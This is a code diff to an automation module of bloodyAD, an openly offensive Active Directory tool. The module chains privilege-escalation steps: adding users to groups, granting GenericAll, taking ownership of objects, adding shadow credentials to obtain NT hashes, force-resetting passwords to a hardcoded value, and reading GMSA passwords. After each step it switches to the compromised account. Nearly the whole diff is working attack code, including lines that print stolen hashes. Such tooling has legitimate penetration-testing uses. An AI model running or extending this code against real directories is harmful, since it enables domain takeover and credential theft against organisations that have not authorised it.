@@ -1,8 +1,8 @@
 from bloodyAD import ConnectionHandler
 from bloodyAD.cli_modules import add, set, remove, get
 from bloodyAD.exceptions import LOG
-from bloodyAD.network.ldap import accesscontrol
-import base64
+from badldap.commons.exceptions import LDAPModifyException
+import logging, re
 # Constant for password changes
 PASSWORD_DEFAULT = "AutoBl00dy123!"
 
@@ -15,17 +15,20 @@ class Automation:
             1: self._dcSync,
             2: self._setDCSync,
             3: self._ownerDomain,
-            4: self._readGMSAPassword,
+            10: self._readGMSAPassword,
             100: self._addMember,
-            200: self._aclOuGpo,
+            200: self._aclGroup,
             300: self._ownerGroup,
+            400: self._genericAll,
+            500: self._genericAll,
+            600: self._ownerContainer,
+            10000: self._genericAll,
+            11000: self._genericAll,
+            12000: self._ownerContainer,
             100000: self._shadowCredentialsOrForceChange,
-            100001: self._aclObj,
-            100002: self._ownerObj,
+            100001: self._aclPrincipal,
+            100002: self._ownerPrincipal,
             110000: self._forceChangePassword,
-            250: self._genericAll,
-            350: self._ownerSpecialObj,
-            400000: self._readGMSAPassword,
         }
         self.dirty_laundry = []
 
@@ -38,6 +41,7 @@ class Automation:
             "owner": "[Ownership Given] on {} to {}",
             "password": "[Change password] of {} to {}",
             "readGMSAPassword": "[Read GMSA Password] from {}",
+            "shadowCredentials": "[Add Shadow Credentials] (if fails, fallback to password change) to {}",
         }
         print(f"\nAuthenticated as {self.co_args.username}:\n")
         await self._unfold()
@@ -141,112 +145,43 @@ class Automation:
 
     async def _addMember(self, rel):
         add_operation = add.groupMember
+        member = rel["start_node"]["name"]
+        group = rel["end_node"]["name"]
         if self.simulation:
-            member = rel["start_node"]["name"]
-            group = rel["end_node"]["name"]
             self._printOperation(add_operation.__name__, [group, member])
         else:
-            member = rel["start_node"]["objectid"]
-            group = rel["end_node"]["distinguishedname"]
+            member_sid = rel["start_node"]["objectid"]
+            group_dn = rel["end_node"]["distinguishedname"]
             try:
-                await add_operation(self.conn, group, member)
-            except Exception as e:
+                await add_operation(self.conn, group_dn, member_sid)
+                ldap_co = await self.conn.getLdap()
+                # Reconnect to apply changes
+                await ldap_co.connect()
+                self.dirty_laundry.append({"f": remove.groupMember, "args": [group_dn, member_sid]})
+            except LDAPModifyException as e:
                 # Check if it's an entryAlreadyExists error
-                if "entryAlreadyExists" in str(e) or "LDAPModifyException" in str(type(e).__name__):
-                    LOG.warning(f"Entry already exists, continuing exploit: {e}")
+                if e.resultcode == 68:
+                    LOG.warning(f"{member} already in {group}, continuing exploitation...")
                 else:
-                    raise
-        self.dirty_laundry.append({"f": remove.groupMember, "args": [group, member]})
+                    raise e
 
     async def _aclGroup(self, rel):
         await self._genericAll(rel)
         await self._addMember(rel)
 
-    async def _aclOuGpo(self, rel):
-        """
-        Check if the ntsecuritydescriptor has GenericAll or GenericWrite with inheritance set.
-        If inheritance is not set, call _genericAll.
-        """
-        if self.simulation:
-            # In simulation mode, just call _genericAll
-            await self._genericAll(rel)
-        else:
-            # Get the current security descriptor
-            target_dn = rel["end_node"]["distinguishedname"]
-            user_dn = rel["start_node"]["distinguishedname"]
-            
-            # Get the SID of the calling user
-            ldap = await self.conn.getLdap()
-            user_entry = None
-            async for entry in ldap.bloodysearch(user_dn, attr=["objectSid"]):
-                user_entry = entry
-                break
-            
-            if not user_entry:
-                LOG.warning(f"Could not find user SID for {user_dn}, calling _genericAll")
-                await self._genericAll(rel)
-                return
-            
-            user_sid = user_entry["objectSid"]
-            
-            # Get the security descriptor of the target
-            target_entry = None
-            async for entry in ldap.bloodysearch(target_dn, attr=["nTSecurityDescriptor"]):
-                target_entry = entry
-                break
-            
-            if not target_entry or "nTSecurityDescriptor" not in target_entry:
-                LOG.warning(f"Could not retrieve nTSecurityDescriptor for {target_dn}, calling _genericAll")
-                await self._genericAll(rel)
-                return
-            
-            # Parse the security descriptor
-            sd_data = target_entry["nTSecurityDescriptor"]
-            sd = add.SECURITY_DESCRIPTOR()
-            sd.from_bytes(sd_data)
-            
-            # Check if user has GenericAll or GenericWrite with inheritance
-            has_inherited_right = False
-            for ace in sd["Dacl"].aces:
-                # Check if this ACE is for our user
-                ace_sid = ace["Ace"]["Sid"].formatCanonical()
-                if ace_sid == user_sid:
-                    # Check if it has GenericAll or GenericWrite permissions
-                    mask = ace["Ace"]["Mask"]["Mask"]
-                    # GenericAll = 0x10000000 (GENERIC_ALL), GenericWrite = 0x40000000 (GENERIC_WRITE)
-                    # Or check for full control (0x000f01ff)
-                    has_generic_all = (mask & 0x10000000) or (mask & 0x000f01ff) == 0x000f01ff
-                    has_generic_write = mask & 0x40000000
-                    
-                    if has_generic_all or has_generic_write:
-                        # Check if ACE has inheritance flags
-                        ace_flags = ace["AceFlags"]
-                        # Check for CONTAINER_INHERIT_ACE (2) or OBJECT_INHERIT_ACE (1)
-                        has_inheritance = (ace_flags & 1) or (ace_flags & 2)
-                        
-                        if has_inheritance:
-                            has_inherited_right = True
-                            LOG.info(f"User {user_dn} already has GenericAll/GenericWrite with inheritance on {target_dn}")
-                            break
-            
-            # If no inherited right found, add it
-            if not has_inherited_right:
-                LOG.info(f"User {user_dn} does not have GenericAll/GenericWrite with inheritance on {target_dn}, adding it")
-                await self._genericAll(rel)
-
     async def _ownerGroup(self, rel):
         await self._setOwner(rel)
         await self._aclGroup(rel)
 
-    async def _aclObj(self, rel):
+    async def _aclPrincipal(self, rel):
         await self._genericAll(rel)
-        await self._forceChangePassword(rel)
+        await self._shadowCredentialsOrForceChange(rel)
 
-    async def _ownerObj(self, rel):
+    async def _ownerPrincipal(self, rel):
         await self._setOwner(rel)
-        await self._aclObj(rel)
+        await self._aclPrincipal(rel)
 
-    async def _ownerSpecialObj(self, rel):
+    async def _ownerContainer(self, rel):
         await self._setOwner(rel)
         await self._genericAll(rel)
 
@@ -254,63 +189,52 @@ class Automation:
         """
         Try to use shadowCredentials first, fall back to forceChangePassword if not possible
         """
-        try:
-            if self.simulation:
-                user = rel["end_node"]["name"]
-                self._printOperation("password", [user, "shadowCredentials"])
+        target = rel["end_node"]["name"]
+        shadow_operation = add.shadowCredentials
+        if self.simulation:
+            self._printOperation(shadow_operation.__name__, [target])
+        else:
+            target_dn = rel["end_node"]["distinguishedname"]
+                
+            # Try shadowCredentials
+            LOG.debug("Attempting shadowCredentials attack")
+            #"try:
+            key_matches, result = await extractFromLogs(r'key: (\S+)', shadow_operation, self.conn, target_dn)
+            key_groups = key_matches.groups() if key_matches else None
+            key = None
+            if key_groups:
+                key = key_groups[0]
             else:
-                target_dn = rel["end_node"]["distinguishedname"]
-                
-                # Try shadowCredentials
-                LOG.info("Attempting shadowCredentials attack")
-                result = await add.shadowCredentials(self.conn, target_dn)
-                
-                # Extract NT hash from result
-                if result and len(result) > 0:
-                    nthash = result[0].get('NT')
-                    if nthash:
-                        LOG.info(f"Successfully obtained NT hash via shadowCredentials")
-                        
-                        # Get the sAMAccountName for the user
-                        ldap = await self.conn.getLdap()
-                        user_entry = None
-                        async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
-                            user_entry = entry
-                            break
-                        
-                        if user_entry:
-                            user = user_entry["sAMAccountName"]
-                            # Pass NT hash in the format ":nt_hash" for NTLM authentication
-                            pwd = ":"+nthash
-                            LOG.info(f"Switching to user: {user}")
-                            await self._switchUser(user, pwd)
-                            return
-                        
-                # If we get here, shadowCredentials didn't work as expected
-                LOG.warning("shadowCredentials did not return expected results, falling back to forceChangePassword")
-                await self._forceChangePassword(rel)
-                
-        except Exception as e:
-            # If shadowCredentials fails, fall back to forceChangePassword
-            LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
-            await self._forceChangePassword(rel)
+                LOG.warning("Could not extract key from shadowCredentials logs, key won't be removed after exploit")
+
+            pwd = ":" + result[1]    
+            print(f"Successfully obtained NT hash of {target} via shadowCredentials: {result[1]}")
+            # Pass NT hash in the format ":nt_hash" for NTLM authentication
+            LOG.info(f"Switching to user: {target}")
+            self.dirty_laundry.append({"f": remove.shadowCredentials, "args": [target_dn, key]})
+            await self._switchUser(target, pwd)
+            # except Exception as e:
+            #     # If shadowCredentials fails, fall back to forceChangePassword
+            #     LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
+            #     await self._forceChangePassword(rel)
 
     # ForceChangePassword edge directly changes the password
     async def _forceChangePassword(self, rel):
         pwd = PASSWORD_DEFAULT
+        pwd_operation = set.password
         if self.simulation:
             user = rel["end_node"]["name"]
-            self._printOperation("password", [user, pwd])
+            self._printOperation(pwd_operation.__name__, [user, pwd])
         else:
             user_dn = rel["end_node"]["distinguishedname"]
-            await set.password(self.conn, user_dn, pwd)
+            await pwd_operation(self.conn, user_dn, pwd)
             ldap = await self.conn.getLdap()
             user_entry = None
             async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
                 user_entry = entry
                 break
             user = user_entry["sAMAccountName"]
-            LOG.debug(f"switching to LDAP connection for user {user}")
+            LOG.info(f"switching to LDAP connection for user {user}")
         await self._switchUser(user, pwd)
 
     async def _genericAll(self, rel):
@@ -322,14 +246,7 @@ class Automation:
         else:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
-            try:
-                await add_operation(self.conn, target, user)
-            except Exception as e:
-                # Check if it's an entryAlreadyExists error
-                if "entryAlreadyExists" in str(e) or "LDAPModifyException" in str(type(e).__name__):
-                    LOG.warning(f"Entry already exists, continuing exploit: {e}")
-                else:
-                    raise
+            await add_operation(self.conn, target, user)
         self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})
 
     async def _setOwner(self, rel):
@@ -345,8 +262,8 @@ class Automation:
 
     async def _readGMSAPassword(self, rel):
         """Exploit ReadGMSAPassword edge to retrieve GMSA password"""
-        if self.simulation:
-            target = rel["end_node"]["name"]
+        target = rel["end_node"]["name"]
+        if self.simulation:          
             self._printOperation("readGMSAPassword", [target])
         else:
             target_dn = rel["end_node"]["distinguishedname"]
@@ -360,7 +277,7 @@ class Automation:
                     break
                 
             if nthash:
-                LOG.info(f"Retrieved GMSA NT hash: {nthash}")
+                print(f"From {target}, retrieved GMSA NT hash: {nthash}")
                 
                 # Get the sAMAccountName for the GMSA account
                 ldap = await self.conn.getLdap()
@@ -378,7 +295,7 @@ class Automation:
                 else:
                     LOG.warning("Could not retrieve sAMAccountName for GMSA account")
             else:
-                LOG.error("Failed to retrieve GMSA password")
+                raise ValueError("Failed to retrieve GMSA password")
 
 
     def _printOperation(self, operation_name, operation_args, revert=False):
@@ -391,3 +308,27 @@ class Automation:
         operation_str += self.rel_str[operation_name]
         arg_nb = operation_str.count("{")
         print(operation_str.format(*operation_args[:arg_nb]))
+
+
+
+# Utilities
+class Grabber(logging.Handler):
+        def __init__(self, pattern):
+            super().__init__()
+            self.match = None
+            self.pattern = pattern
+
+        def emit(self, record: logging.LogRecord):
+            msg = record.getMessage()
+            self.match = re.search(self.pattern, msg)
+
+async def extractFromLogs(pattern, function, *args, **kwargs):
+    logger = logging.getLogger('bloodyAD')
+    logger.setLevel(logging.INFO)
+    grabber = Grabber(pattern)
+    logger.addHandler(grabber)
+    try:
+        results = await function(*args, **kwargs)
+    finally:
+        logger.removeHandler(grabber)
+    return (grabber.match, results)
